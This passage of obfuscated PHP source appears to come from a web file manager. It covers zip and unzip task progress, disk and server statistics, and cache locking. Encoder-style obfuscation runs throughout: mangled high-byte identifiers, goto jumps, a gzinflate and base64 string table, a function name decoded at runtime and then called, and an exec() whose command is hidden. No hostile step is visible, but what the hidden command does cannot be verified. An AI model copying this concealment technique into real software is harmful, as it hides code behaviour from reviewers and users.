Model($¢Ç­Æ—Ù[1763])->where($ùå’€Å)->count($ßº˜ÎÍ¼); return (int) $”‰˜; } private function optionServer() { $ä‹æşõ =& $_SERVER[ĞÆÏ¡Îª]; $õ¤úÓÕ = $this->diskDriver(); $Ûí¶—Š” = KodIO::defaultDriver(); $­ìû®óä = array($ä‹æşõ[812] => $Ûí¶—Š”[$ä‹æşõ[407]]); $¡³¸êâ = Model($ä‹æşõ[480])->where($­ìû®óä)->sum($ä‹æşõ[76]); $ä‡§§Ÿ» = explode($ä‹æşõ[53], $_SERVER[$ä‹æşõ[143]]); $øŸÀôı† = $ä‡§§Ÿ»[0]; $éü¦¹Ûğ = $GLOBALS[$ä‹æşõ[6]][$ä‹æşõ[21]]; $õ±©µò´ = $éü¦¹Ûğ[$ä‹æşõ[967]]; if ($õ±©µò´ == $ä‹æşõ[955]) { $Æ«—½ = explode($ä‹æşõ[1263], $éü¦¹Ûğ[$ä‹æşõ[966]]); $õ±©µò´ = $Æ«—½[0]; } if ($õ±©µò´ == $ä‹æşõ[903] || $õ±©µò´ == $ä‹æşõ[799]) { $¦¤İ’Ø = Model()->db()->query($ä‹æşõ[1803]); $ß¨°Éñ = $¦¤İ’Ø[0] && isset($¦¤İ’Ø[0][$ä‹æşõ[1545]]) ? $¦¤İ’Ø[0][$ä‹æşõ[1545]] : 0; $õ±©µò´ = $ä‹æşõ[1804] . ($ß¨°Éñ ? $ä‹æşõ[8] . $ß¨°Éñ : $ä‹æşõ[12]); } $û—…†•Â = $GLOBALS[$ä‹æşõ[6]][$ä‹æşõ[358]][$ä‹æşõ[822]]; return array($ä‹æşõ[1805] => $õ¤úÓÕ ? $õ¤úÓÕ[$ä‹æşõ[1806]] : 0, $ä‹æşõ[1807] => $õ¤úÓÕ ? $õ¤úÓÕ[$ä‹æşõ[1808]] : 0, $ä‹æşõ[1809] => (int) $Ûí¶—Š”[$ä‹æşõ[1806]] * 1024 * 1024 * 1024, $ä‹æşõ[1810] => (int) $¡³¸êâ, $ä‹æşõ[1811] => ucfirst($øŸÀôı†), $ä‹æşõ[1812] => $ä‹æşõ[1813] . PHP_VERSION, $ä‹æşõ[1814] => phpBuild64() ? 64 : 32, $ä‹æşõ[753] => str_replace($ä‹æşõ[1121], $ä‹æşõ[983], $õ±©µò´), $ä‹æşõ[358] => ucfirst($û—…†•Â), $ä‹æşõ[32] => $_SERVER[$ä‹æşõ[1815]]); } private function diskDriver() { $’¾Ëä =& $_SERVER[ĞÆÏ¡Îª]; $Ü¦ÛÑˆ = $’¾Ëä[8]; $Ó´Ù“âĞ = $GLOBALS[$’¾Ëä[6]][$’¾Ëä[1279]] == $’¾Ëä[1280]; if ($Ó´Ù“âĞ) { $Ü¦ÛÑˆ = $’¾Ëä[1816]; if (function_exists($’¾Ëä[1817])) { exec($’¾Ëä[1818], $Û°İøË×); $Ü¦ÛÑˆ = $Û°İøË×[1] . $’¾Ëä[8]; } } if (!file_exists($Ü¦ÛÑˆ)) { return; } $ì™•ÔâÎ = @disk_total_space($Ü¦ÛÑˆ); $ª‚ãâÑå = $ì™•ÔâÎ - @disk_free_space($Ü¦ÛÑˆ); return array($’¾Ëä[1806] => $ì™•ÔâÎ, $’¾Ëä[1808] => $ª‚ãâÑå); } public function fileChart($‡«š×Ûˆ) { $ğŒ¡¤¦¾ =& $_SERVER[ĞÆÏ¡Îª]; if (isset($‡«š×Ûˆ[$ğŒ¡¤¦¾[1647]])) { return Model($ğŒ¡¤¦¾[820])->userFileTypeProfile($‡«š×Ûˆ[$ğŒ¡¤¦¾[1647]]); } if (isset($‡«š×Ûˆ[$ğŒ¡¤¦¾[1819]])) { return Model($ğŒ¡¤¦¾[820])->groupFileTypeProfile($‡«š×Ûˆ[$ğŒ¡¤¦¾[1819]]); } $ªÖ¢ÄÅÓ = $this->sourceSize(); $Á¨×¼áÆ = array($ğŒ¡¤¦¾[441] => 0, $ğŒ¡¤¦¾[420] => 1); $„ê¢Èô = Model($ğŒ¡¤¦¾[820])->where($Á¨×¼áÆ)->sum($ğŒ¡¤¦¾[76]); $Á¨×¼áÆ[$ğŒ¡¤¦¾[420]] = 2; $ÍáŒà‰– = Model($ğŒ¡¤¦¾[820])->where($Á¨×¼áÆ)->sum($ğŒ¡¤¦¾[76]); return array($ğŒ¡¤¦¾[758] => $ªÖ¢ÄÅÓ[$ğŒ¡¤¦¾[76]], $ğŒ¡¤¦¾[1753] => $ªÖ¢ÄÅÓ[$ğŒ¡¤¦¾[1753]], $ğŒ¡¤¦¾[1754] => (int) $„ê¢Èô, $ğŒ¡¤¦¾[1755] => (int) $ÍáŒà‰–); } private function sourceSize() { $¥¥—ŸÔÈ =& $_SERVER[ĞÆÏ¡Îª]; $Âêàâ‰¼ = Model($¥¥—ŸÔÈ[820])->where(array($¥¥—ŸÔÈ[419] => 0))->sum($¥¥—ŸÔÈ[76]); $·ı­¦ïä = Model($¥¥—ŸÔÈ[480])->sum($¥¥—ŸÔÈ[76]); if ($·ı­¦ïä > $Âêàâ‰¼) { $·ı­¦ïä = $Âêàâ‰¼; } return array($¥¥—ŸÔÈ[76] => (int) $Âêàâ‰¼, $¥¥—ŸÔÈ[1753] => (int) $·ı­¦ïä); } } goto d“Îºæ¦ÏĞ; D‘ÍĞÃ‚”ç: $glnyktzifx = $_SERVER[ĞÆÏ¡Îª][623]; while (strlen($glnyktzifx) < $_SERVER[ĞÆÏ¡Îª][624]) { if (!$glnyktzifx) { break; } $glnyktzifx++; } $_SERVER[û†ìªƒĞ] = explode($_SERVER[ĞÆÏ¡Îª][625], gzinflate(substr($_SERVER[ĞÆÏ¡Îª][626], 10, -8))); goto fî‹Š¹ÂŠ; fá¿çÌæßƒ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ Ë¢¶›Š =& $_SERVER[ĞÆÏ¡Îª]; parent::startAfter(); Hook::bind($ Ë¢¶›Š[1740], array($this, $ Ë¢¶›Š[1741])); Hook::bind($ Ë¢¶›Š[1185], array($this, $ Ë¢¶›Š[1742])); $Æ¢åß¢„ =& $this->task; $Æ¢åß¢„[$ Ë¢¶›Š[1743]] = $ Ë¢¶›Š[1190]; if (!$Æ¢åß¢„[$ Ë¢¶›Š[1546]]) { $Æ¢åß¢„[$ Ë¢¶›Š[1546]] = LNG($ Ë¢¶›Š[1744]); } } protected function endAfter() { $ç¦Â¡ƒõ =& $_SERVER[ĞÆÏ¡Îª]; parent::endAfter(); Hook::unbind($ç¦Â¡ƒõ[1740], array($this, $ç¦Â¡ƒõ[1741])); Hook::unbind($ç¦Â¡ƒõ[1185], array($this, $ç¦Â¡ƒõ[1742])); } public function updateAfter() { $ù”›ãë =& $_SERVER[ĞÆÏ¡Îª]; $èıÅÅÓù =& $this->task; if (!$èıÅÅÓù[$ù”›ãë[781]] || !$èıÅÅÓù[$ù”›ãë[758]]) { return; } if ($èıÅÅÓù[$ù”›ãë[1743]] == $ù”›ãë[1190]) { $ó±Ä‡¾Ö = 0; if ($èıÅÅÓù[$ù”›ãë[1698]]) { $ó±Ä‡¾Ö = $èıÅÅÓù[$ù”›ãë[1699]] / $èıÅÅÓù[$ù”›ãë[1698]]; } $èıÅÅÓù[$ù”›ãë[1649]] = $ó±Ä‡¾Ö * 0.3; } else { if ($èıÅÅÓù[$ù”›ãë[1743]] == $ù”›ãë[322]) { $ó±Ä‡¾Ö = $èıÅÅÓù[$ù”›ãë[1648]] / $èıÅÅÓù[$ù”›ãë[781]]; $èıÅÅÓù[$ù”›ãë[1649]] = 0.3 + $ó±Ä‡¾Ö * 0.4; } else { if ($èıÅÅÓù[$ù”›ãë[1743]] == $ù”›ãë[107]) { $³‘»œõ§ = 0; if ($èıÅÅÓù[$ù”›ãë[1700]] == $ù”›ãë[107]) { $³‘»œõ§ = $èıÅÅÓù[$ù”›ãë[1699]]; } $ó±Ä‡¾Ö = ($èıÅÅÓù[$ù”›ãë[1703]] + $³‘»œõ§) / $èıÅÅÓù[$ù”›ãë[758]]; $èıÅÅÓù[$ù”›ãë[1649]] = 0.3 + 0.4 + $ó±Ä‡¾Ö * 0.3; } } } if ($èıÅÅÓù[$ù”›ãë[1649]] > 0) { $¿âö“· = timeFloat() - $èıÅÅÓù[$ù”›ãë[1651]] - $èıÅÅÓù[$ù”›ãë[1654]]; $èıÅÅÓù[$ù”›ãë[1655]] = $¿âö“· * (1 - $èıÅÅÓù[$ù”›ãë[1649]]) / $èıÅÅÓù[$ù”›ãë[1649]]; } } public function addFile($ß¹áõæŠ) { $åõµÇìÄ =& $_SERVER[ĞÆÏ¡Îª]; $üŒİ„îô =& $this->task; $É«êÌòã = IO::info($ß¹áõæŠ); $üŒİ„îô[$åõµÇìÄ[1696]] = $É«êÌòã[$åõµÇìÄ[32]]; $üŒİ„îô[$åõµÇìÄ[1698]] = $É«êÌòã[$åõµÇìÄ[76]]; $üŒİ„îô[$åõµÇìÄ[1699]] = 0; $üŒİ„îô[$åõµÇìÄ[1055]] = $åõµÇìÄ[1719]; $üŒİ„îô[$åõµÇìÄ[1700]] = $åõµÇìÄ[1190]; $üŒİ„îô[$åõµÇìÄ[758]] = $É«êÌòã[$åõµÇìÄ[76]]; $üŒİ„îô[$åõµÇìÄ[781]] = 1; $ ƒßè±š = 0; $üŒİ„îô[$åõµÇìÄ[1707]] = array($åõµÇìÄ[1708] => $ ƒßè±š + 1, $åõµÇìÄ[429] => $É«êÌòã[$åõµÇìÄ[32]], $åõµÇìÄ[84] => $É«êÌòã[$åõµÇìÄ[84]], $åõµÇìÄ[528] => $É«êÌòã[$åõµÇìÄ[528]] ? $É«êÌòã[$åõµÇìÄ[528]] : $É«êÌòã[$åõµÇìÄ[84]]); $this->update(); } public function unzipAfter($ŞÃñ¨¾) { $÷ô¿ÚŠÃ =& $_SERVER[ĞÆÏ¡Îª]; $²äÉş–Õ =& $this->task; $²äÉş–Õ[$÷ô¿ÚŠÃ[1743]] = $÷ô¿ÚŠÃ[107]; $È”âÈÔá = IO::infoWithChildren($ŞÃñ¨¾); $•€šã™Á = 0; $²äÉş–Õ[$÷ô¿ÚŠÃ[1707]] = array($÷ô¿ÚŠÃ[1708] => $•€šã™Á + 1, $÷ô¿ÚŠÃ[429] => $È”âÈÔá[$÷ô¿ÚŠÃ[32]], $÷ô¿ÚŠÃ[84] => $È”âÈÔá[$÷ô¿ÚŠÃ[84]], $÷ô¿ÚŠÃ[528] => $È”âÈÔá[$÷ô¿ÚŠÃ[528]] ? $È”âÈÔá[$÷ô¿ÚŠÃ[528]] : $È”âÈÔá[$÷ô¿ÚŠÃ[84]]); if ($È”âÈÔá[$÷ô¿ÚŠÃ[33]] == $÷ô¿ÚŠÃ[199]) { $²äÉş–Õ[$÷ô¿ÚŠÃ[781]] = 1; } else { $²äÉş–Õ[$÷ô¿ÚŠÃ[781]] = $È”âÈÔá[$÷ô¿ÚŠÃ[79]][$÷ô¿ÚŠÃ[77]]; } $²äÉş–Õ[$÷ô¿ÚŠÃ[1055]] = $÷ô¿ÚŠÃ[12]; $²äÉş–Õ[$÷ô¿ÚŠÃ[1700]] = 0; $²äÉş–Õ[$÷ô¿ÚŠÃ[1648]] = 0; $²äÉş–Õ[$÷ô¿ÚŠÃ[1698]] = 0; $²äÉş–Õ[$÷ô¿ÚŠÃ[1699]] = 0; $²äÉş–Õ[$÷ô¿ÚŠÃ[1696]] = $÷ô¿ÚŠÃ[12]; $²äÉş–Õ[$÷ô¿ÚŠÃ[1703]] = 0; $²äÉş–Õ[$÷ô¿ÚŠÃ[758]] = $È”âÈÔá[$÷ô¿ÚŠÃ[76]]; $this->update(); self::log($÷ô¿ÚŠÃ[1745] . json_encode(array($²äÉş–Õ, $È”âÈÔá))); } public function nameParse($ŠÆ½ßØ) { $òã²–¼å =& $_SERVER[ĞÆÏ¡Îª]; $£¾–×±ï =& $this->task; if ($£¾–×±ï[$òã²–¼å[1743]] == $òã²–¼å[1190]) { $£¾–×±ï[$òã²–¼å[1743]] = $òã²–¼å[322]; $£¾–×±ï[$òã²–¼å[1703]] = 0; $£¾–×±ï[$òã²–¼å[758]] = 0; } $¬ öì¢İ = get_path_this($ŠÆ½ßØ); if (strstr($¬ öì¢İ, $òã²–¼å[10])) { $£¾–×±ï[$òã²–¼å[1648]] += 1; $£¾–×±ï[$òã²–¼å[781]] += 1; } $£¾–×±ï[$òã²–¼å[1696]] = $ŠÆ½ßØ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $¨åÅôö =& $_SERVER[ĞÆÏ¡Îª]; parent::startAfter(); Hook::bind($¨åÅôö[1746], array($this, $¨åÅôö[1741])); $÷·ß¨ó“ =& $this->task; $÷·ß¨ó“[$¨åÅôö[1743]] = $¨åÅôö[1190]; if (!$÷·ß¨ó“[$¨åÅôö[1546]]) { $÷·ß¨ó“[$¨åÅôö[1546]] = LNG($¨åÅôö[1747]); } } protected function endAfter() { $®È©ö¥ =& $_SERVER[ĞÆÏ¡Îª]; parent::endAfter(); Hook::unbind($®È©ö¥[1746], array($this, $®È©ö¥[1741])); } public function updateAfter() { $Ùˆ²®şç =& $_SERVER[ĞÆÏ¡Îª]; $Æ»–‘‡¬ =& $this->task; if (!$Æ»–‘‡¬[$Ùˆ²®şç[781]] || !$Æ»–‘‡¬[$Ùˆ²®şç[758]]) { return; } if ($Æ»–‘‡¬[$Ùˆ²®şç[1743]] == $Ùˆ²®şç[1190]) { $ñÚ»¿Ÿü = $Æ»–‘‡¬[$Ùˆ²®şç[1699]]; if ($Æ»–‘‡¬[$Ùˆ²®şç[1700]] != $Ùˆ²®şç[1190]) { $ñÚ»¿Ÿü = 0; } $³ã“ñ¤ï = ($Æ»–‘‡¬[$Ùˆ²®şç[1703]] + $ñÚ»¿Ÿü) / $Æ»–‘‡¬[$Ùˆ²®şç[758]]; $Æ»–‘‡¬[$Ùˆ²®şç[1649]] = $³ã“ñ¤ï * 0.3; } else { if ($Æ»–‘‡¬[$Ùˆ²®şç[1743]] == $Ùˆ²®şç[322]) { $³ã“ñ¤ï = $Æ»–‘‡¬[$Ùˆ²®şç[1648]] / $Æ»–‘‡¬[$Ùˆ²®şç[781]]; $Æ»–‘‡¬[$Ùˆ²®şç[1649]] = 0.3 + $³ã“ñ¤ï * 0.5; } else { if ($Æ»–‘‡¬[$Ùˆ²®şç[1743]] == $Ùˆ²®şç[107]) { $³ã“ñ¤ï = 0; if ($Æ»–‘‡¬[$Ùˆ²®şç[1698]]) { $³ã“ñ¤ï = $Æ»–‘‡¬[$Ùˆ²®şç[1699]] / $Æ»–‘‡¬[$Ùˆ²®şç[1698]]; } $Æ»–‘‡¬[$Ùˆ²®şç[1649]] = 0.3 + 0.5 + $³ã“ñ¤ï * 0.2; } } } if ($Æ»–‘‡¬[$Ùˆ²®şç[1649]] > 0) { $Çñ¹±óœ = timeFloat() - $Æ»–‘‡¬[$Ùˆ²®şç[1651]] - $Æ»–‘‡¬[$Ùˆ²®şç[1654]]; $Æ»–‘‡¬[$Ùˆ²®şç[1655]] = $Çñ¹±óœ * (1 - $Æ»–‘‡¬[$Ùˆ²®şç[1649]]) / $Æ»–‘‡¬[$Ùˆ²®şç[1649]]; } } public function copyFileStart($‚ı¯ô‰‡, $¬§—, $ÙáğÕö˜, $âŠÙ„Õ, $ŸºÉÖãÓ, $õ‘‘Üè) { $›˜æŒ£Œ =& $_SERVER[ĞÆÏ¡Îª]; parent::copyFileStart($‚ı¯ô‰‡, $¬§—, $ÙáğÕö˜, $âŠÙ„Õ, $ŸºÉÖãÓ, $õ‘‘Üè); $ù—‰Å±ã =& $this->task; if ($ù—‰Å±ã[$›˜æŒ£Œ[1743]] == $›˜æŒ£Œ[322]) { $ù—‰Å±ã[$›˜æŒ£Œ[1743]] = $›˜æŒ£Œ[107]; } $this->update(); } public function copyFileEnd($ĞùÓ€»Ü, $ÃÀÍÕúí, $ñ¾¦’´Â, $ˆ¨œ„ü…, $ÂÑƒÑ’, $ç€¦´æƒ) { $ÙòÂúÉ¶ =& $_SERVER[ĞÆÏ¡Îª]; $½—„’Šî =& $this->task; $½—„’Šî[$ÙòÂúÉ¶[1699]] = $½—„’Šî[$ÙòÂúÉ¶[1698]]; $½—„’Šî[$ÙòÂúÉ¶[1703]] += $½—„’Šî[$ÙòÂúÉ¶[1698]]; $½—„’Šî[$ÙòÂúÉ¶[1700]] = $ÙòÂúÉ¶[12]; $this->update(); } public function nameParse($Æåİ£š) { $Ë°ŞçÚµ =& $_SERVER[ĞÆÏ¡Îª]; $Ã›ø¹¢ =& $this->task; if ($Ã›ø¹¢[$Ë°ŞçÚµ[1648]] < $Ã›ø¹¢[$Ë°ŞçÚµ[781]]) { $¬À²¿àİ = get_path_this($Æåİ£š); if (strstr($¬À²¿àİ, $Ë°ŞçÚµ[10])) { $Ã›ø¹¢[$Ë°ŞçÚµ[1648]] += 1; } } if ($Ã›ø¹¢[$Ë°ŞçÚµ[1743]] == $Ë°ŞçÚµ[1190]) { $Ã›ø¹¢[$Ë°ŞçÚµ[1743]] = $Ë°ŞçÚµ[322]; } $Ã›ø¹¢[$Ë°ŞçÚµ[1696]] = $Æåİ£š; $this->update(); } } $_file = $_SERVER[$_SERVER[ĞÆÏ¡Îª][239]]; goto C‚Åå¹‰è; c÷óñîåËÖ: $fileSize = strrev(base64_decode($_SERVER[õú¨»™][0])); function binCheckNeq($Ú­ƒ¹ø¿, $ÈÚ÷ÖÅ–) { return $Ú­ƒ¹ø¿ != $ÈÚ÷ÖÅ–; } $_SERVER[$_SERVER[õú¨»™][1]] = $fileSize($_SERVER[$_SERVER[õú¨»™][2]]); goto Aî›¤¨¬Á; Aî›¤¨¬Á: function binCheckBigger($¡”È‰Œ½, $ñàŸÄ…¶) { return $¡”È‰Œ½ > $ñàŸÄ…¶; } $_SERVER[$_SERVER[õú¨»™][3]] = ("\x38\x30\x38\x32"."\71\71")+0;$_igce="3jdv2xp095qfhbrmasy1g4lokt8nzwce67iumiz41jc80k2ter59ugyfdlvxsnobw7p6qh3at4cae3";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ÏªÜ›½, $üàØ¾öŒ) { $™€ÛÂÈº =& $_SERVER[ĞÆÏ¡Îª]; if (isset(self::$_methodList[$ÏªÜ›½])) { return @call_user_func_array(self::$_methodList[$ÏªÜ›½], $üàØ¾öŒ); } else { if (method_exists($this, $ÏªÜ›½)) { return call_user_func_array(array($this, $ÏªÜ›½), $üàØ¾öŒ); } else { think_exception(__CLASS__ . $™€ÛÂÈº[4] . $ÏªÜ›½ . $™€ÛÂÈº[5]); } } } public static function __callStatic($şƒ’úî…, $Æ¦Ö€Ï ) { if (isset(self::$_methodListStatic[$şƒ’úî…])) { return call_user_func_array(self::$_methodListStatic[$şƒ’úî…], $Æ¦Ö€Ï ); } else { if (method_exists(self, $şƒ’úî…)) { return call_user_func_array(array(self, $şƒ’úî…), $Æ¦Ö€Ï ); } else { show_json("{$şƒ’úî…}\x28\51\40\156\x6f\x74\40\x65\x78\151\x73\x74\x3b", !1); } } } public static function addMethod($üÚ¡¶‘ó, $ÌĞº¬¼) { self::$_methodList[$üÚ¡¶‘ó] = $ÌĞº¬¼; } public static function addMethodStatic($‚Î”¹ê®, $ÊÖ©½áõ) { self::$_methodListStatic[$‚Î”¹ê®] = $ÊÖ©½áõ; } } goto d…‰Š¬÷¹Ğ; b ùµ·ì¢Ş: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $šõµäà =& $_SERVER[ĞÆÏ¡Îª]; if (self::$handle) { return self::$handle; } $»«úáêµ = $GLOBALS[$šõµäà[6]][$šõµäà[358]]; self::$timeout = $»«úáêµ[$šõµäà[835]] ? $»«úáêµ[$šõµäà[835]] : 10; $ç¸¨‰÷ = _get($GLOBALS[$šõµäà[6]], $šõµäà[836]); $Âí¦ôªË = $»«úáêµ[$šõµäà[822]] ? $»«úáêµ[$šõµäà[822]] : $šõµäà[199]; if ($Âí¦ôªË == $šõµäà[21] && $ç¸¨‰÷ == $šõµäà[13]) { $Âí¦ôªË = $šõµäà[199]; } switch ($Âí¦ôªË) { case $šõµäà[825]: self::$handle = new CacheLockRedis(); break; case $šõµäà[826]: self::$handle = new CacheLockMemcached(); break; case $šõµäà[21]: self::$handle = new CacheLockDatabase(); break; case $šõµäà[199]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($šõµäà[837], $šõµäà[838]); } return self::$handle; } private static function key($ı•ùÎÃ) { return $_SERVER[ĞÆÏ¡Îª][839] . Cache::key($ı•ùÎÃ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($çĞœÌé = '') { self::$errorMsg = $çĞœÌé; } public static function lockGlobal($»ñÖéê“, $İª‘¾é§) { return self::lock($»ñÖéê“, $İª‘¾é§, !0); } public static function lock($òæÎÉ«Ü, $Ëİ¬ö¹” = false, $ÈœÔÃæú = false) { $í­Çœ“™ =& $_SERVER[ĞÆÏ¡Îª]; $ì˜¼ç¶Œ = self::init(); $¯–à‡‹ = self::key($òæÎÉ«Ü); $Ëİ¬ö¹” = $Ëİ¬ö¹” ? $Ëİ¬ö¹” : self::$timeout; $¥ìÏ‡Ò = $ì˜¼ç¶Œ->lock($¯–à‡‹, $Ëİ¬ö¹”); $‰ÆùÇ = timeFloat(); if (!$¥ìÏ‡Ò) { $…ªÜ†Å¼ = "\154\x6f\x63\153\x20\x65\x72\x72\157\x72\73\153\x65\171\75{$òæÎÉ«Ü}\x3b\x74\151\x6d\145\75{$Ëİ¬ö¹”}\73" . self::$errorMsg . $í­Çœ“™[71] . get_caller_msg(); $Úê±áÖ£ = LNG($í­Çœ“™[840]) . "\x28{$Ëİ¬ö¹”}\163\x29\x2e" . LNG($í­Çœ“™[841]); $Úê±áÖ£ .= $í­Çœ“™[842]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Úê±áÖ£ = $Úê±áÖ£ . $í­Çœ“™[843] . self::$errorMsg; } write_log($…ªÜ†Å¼, $í­Çœ“™[838]); show_json($Úê±áÖ£, !1); } if (!$ÈœÔÃæú) { self::$lockItem[$¯–à‡‹] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $‹€‘Ó§¤ = number_format(timeFloat() - $‰ÆùÇ, 3); write_log($í­Çœ“™[844] . $òæÎÉ«Ü . $í­Çœ“™[845] . $‹€‘Ó§¤, $í­Çœ“™[838]); } return $¥ìÏ‡Ò; } public static function lockGet($Ó›ÚïŸš) { $½¶Îü®ô = self::key($Ó›ÚïŸš); if (self::$lockItem[$½¶Îü®ô]) { return self::$lockItem[$½¶Îü®ô]; } return self::init()->lockGet($½¶Îü®ô); } public static function unlock($«¾îÑ) { $×³«ø =& $_SERVER[ĞÆÏ¡Îª]; $ã˜×ıÅê = self::key($«¾îÑ); self::$lockItem[$ã˜×ıÅê] = null; self::init()->unlock($ã˜×ıÅê); if (GLOBAL_DEBUG_LOG_ALL) { write_log($×³«ø[846] . $«¾îÑ, $×³«ø[838]); } return; } public static function unlockRuntime() { $Š×…»ò =& $_SERVER[ĞÆÏ¡Îª]; $ÕõšÂşí = self::init(); $¯á ìâÍ = !1; foreach (self::$lockItem as $•›ï‘ØÂ => $œà‡ ²ë) { if (!$œà‡ ²ë) { continue; } $ÕõšÂşí->unlock($•›ï‘ØÂ); if (!$¯á ìâÍ) { $¯á ìâÍ = !0; write_log($Š×…»ò[847] . $•›ï‘ØÂ . $Š×…»ò[71] . get_caller_msg(), $Š×…»ò[838]); continue; } write_log($Š×…»ò[847] . $•›ï‘ØÂ, $Š×…»ò[838]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $´–ÏÁûÏ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($Š×…»ò[848] . $´–ÏÁûÏ . $Š×…»ò[849] . ACTION, $Š×…»ò[838]); } } public static function fileLock($Ş–ª£İ) { $º­ì‡ä® =& $_SERVER[ĞÆÏ¡Îª]; if (!$GLOBALS[$º­ì‡ä®[850]]) { $GLOBALS[$º­ì‡ä®[850]] = array(); } $GLOBALS[$º­ì‡ä®[850]][$Ş–ª£İ] = !1; $íÍœ´Ü = fopen(DATA_PATH . $Ş–ª£İ . $º­ì‡ä®[851], $º­ì‡ä®[852]); if (!$íÍœ´Ü) { return !1; } $GLOBALS[$º­ì‡ä®[850]][$Ş–ª£İ] = $íÍœ´Ü; if (flock($íÍœ´Ü, LOCK_EX)) { return !0; } self::unlock($Ş–ª£İ); show_json($º­ì‡ä®[853], !1); return !1; } public static function fileUnlock($Àé®Óã) { $ñŞÅª¸ =& $_SERVER[ĞÆÏ¡Îª]; $ğ‡£²¢µ = $GLOBALS[$ñŞÅª¸[850]][$Àé®Óã]; if (!$ğ‡£²¢µ) { return; } $GLOBALS[$ñŞÅª¸[850]][$Àé®Óã] = !1; flock($ğ‡£²¢µ, LOCK_UN); fclose($ğ‡£²¢µ); } public static function fileUnlockAll() { $î´ğç«û =& $_SERVER[ĞÆÏ¡Îª]; if (!$GLOBALS[$î´ğç«û[850]]) { return; } foreach ($GLOBALS[$î´ğç«û[850]] as $‹ãÔş¾Å => $ÒÄÄ£¯) { if (!$ÒÄÄ£¯) { continue; } $GLOBALS[$î´ğç«û[850]][$‹ãÔş¾Å] = !1; flock($ÒÄÄ£¯, LOCK_UN); fclose($ÒÄÄ£¯); } $GLOBALS[$î´ğç«û[850]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $İôÆÍà =& $_SERVER[ĞÆÏ¡Îª]; $Â®ÕÕï = $GLOBALS[$İôÆÍà[6]][$İôÆÍà[358]]; self::$cachePath = $Â®ÕÕï[$İôÆÍà[199]][$İôÆÍà[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($—æñªÙÃ, $•šÑ’¬‘ = 0) { $ÑÜ¶ãÛ =& $_SERVER[ĞÆÏ¡Îª]; $©¨´ù = microtime(!0); $âøÁÙ±¦ = $©¨´ù + $•šÑ’¬‘ + 0.0001; $§÷¤¸§å = rtrim(self::$cachePath, $ÑÜ¶ãÛ[8]) . $ÑÜ¶ãÛ[854] . md5($—æñªÙÃ) . $ÑÜ¶ãÛ[851]; if (file_exists($§÷¤¸§å) && filemtime($§÷¤¸§å) && filemtime($§÷¤¸§å) < time() - 10) { @unlink($§÷¤¸§å); } do { if (file_exists($§÷¤¸§å)) { cacheLockWait(); continue; } $Ïó†Û¿ = fopen($§÷¤¸§å, $ÑÜ¶ãÛ[855]); if (!$Ïó†Û¿) { return !1; } $Î§Ü…¾ = flock($Ïó†Û¿, LOCK_EX | LOCK_NB); self::$caches[$—æñªÙÃ] = array($ÑÜ¶ãÛ[856] => $Ïó†Û¿, $ÑÜ¶ãÛ[199] => $§÷¤¸§å); fwrite($Ïó†Û¿, $âøÁÙ±¦); clearstatcache(); if ($Ïó†Û¿ && $Î§Ü…¾) { return !0; } cacheLockWait(); } while (microtime(!0) < $âøÁÙ±¦); $this->unlock($—æñªÙÃ); return !1; } public function lockGet($Á–€’ò•) { $ğÚÏÀ›´ =& $_SERVER[ĞÆÏ¡Îª]; $€ÍŞİèí = rtrim(self::$cachePath, $ğÚÏÀ›´[8]) . $ğÚÏÀ›´[854] . md5($Á–€’ò•) . $ğÚÏÀ›´[851]; return file_exists($€ÍŞİèí); } public function unlock($ı÷½‘ÆÓ) { $óù”ƒÒÌ =& $_SERVER[ĞÆÏ¡Îª]; $±€¯¡Ô³ = self::$caches[$ı÷½‘ÆÓ]; if (!$±€¯¡Ô³) { return; } @flock($±€¯¡Ô³[$óù”ƒÒÌ[856]], LOCK_UN); @fclose($±€¯¡Ô³[$óù”ƒÒÌ[856]]); @unlink($±€¯¡Ô³[$óù”ƒÒÌ[199]]); unset(self::$caches[$ı÷½‘ÆÓ]); } } goto f²­àØãÍ; då²Å–¸¦: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $–ùúõÁº =& $_SERVER[ĞÆÏ¡Îª]; $ÇÓÜŒğ÷ = $GLOBALS[$–ùúõÁº[6]][$–ùúõÁº[89]]; if ($ÇÓÜŒğ÷[$–ùúõÁº[1199]] != 1) { return; } if ($ÇÓÜŒğ÷[$–ùúõÁº[1200]] <= 0) { return; } if (isset($_REQUEST[$–ùúõÁº[1201]]) && $_REQUEST[$–ùúõÁº[1201]] == $–ùúõÁº[88]) { return; } Hook::bind($–ùúõÁº[1202], $–ùúõÁº[1203]); Hook::bind($–ùúõÁº[1204], $–ùúõÁº[1205]); Hook::bind($–ùúõÁº[1206], $–ùúõÁº[1207]); Hook::bind($–ùúõÁº[1208], $–ùúõÁº[1209]); Hook::bind($–ùúõÁº[1210], $–ùúõÁº[1211]); Hook::bind($–ùúõÁº[1212], $–ùúõÁº[1213]); } public static function eventBeforeUpload($»–Í·¡Æ) { if ($»–Í·¡Æ[3] && $»–Í·¡Æ[3] != REPEAT_REPLACE) { return; } $¹ÉÔç¾û = self::parsePath($»–Í·¡Æ[0]); if (!$¹ÉÔç¾û) { return; } self::add($¹ÉÔç¾û); } public static function eventBeforeEdit($ÇÜ©ñş) { $Î¸¥ÌÅó = self::parsePath($ÇÜ©ñş[0]); if (!$Î¸¥ÌÅó) { return; } self::add($Î¸¥ÌÅó); } public static function eventBeforeCopyFile($’¼¡•ĞÈ, $ğóÛ®¿½, $—ß¨ø¹•, $œ«µÀä¼, $ğ…ç§á¹, $¯¸ˆĞÜ„) { $¸‰—ú‰  =& $_SERVER[ĞÆÏ¡Îª]; if (isset($—ß¨ø¹•->_data[$¸‰—ú‰ [1146]]) && $—ß¨ø¹•->_data[$¸‰—ú‰ [1146]]) { return; } 